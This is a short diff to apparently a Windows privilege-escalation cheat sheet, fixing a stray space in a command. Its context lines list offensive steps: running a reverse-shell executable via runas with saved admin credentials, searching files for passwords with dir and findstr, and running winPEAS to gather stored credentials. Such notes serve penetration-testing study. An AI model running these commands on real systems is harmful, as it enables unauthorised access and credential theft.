@@ -4330,7 +4330,7 @@ Also called "Service Binary Hijacking". Exploit insecure file permissions on ser
 2. Start a listener on the attacker machine and run the reverse shell executable using `runas` with the admin user's saved credentials: `runas /savecred /user:admin C:\PrivEsc\reverse.exe`
 
 **Search for Configuration Files**
-1. Run the commands: `dir /s *pass* == *.config` and ` findstr /si password *.xml *.ini *.txt`
+1. Run the commands: `dir /s *pass* == *.config` and `findstr /si password *.xml *.ini *.txt`
 2. Use winPEAS to search for common files which may contain credentials: `.\winPEASany.exe quiet cmd searchfast filesinfo`
    - also run `.\winPEASx64.exe windowscreds filesinfo fileanalysis searchpf log=winpeas_out.txt`
 
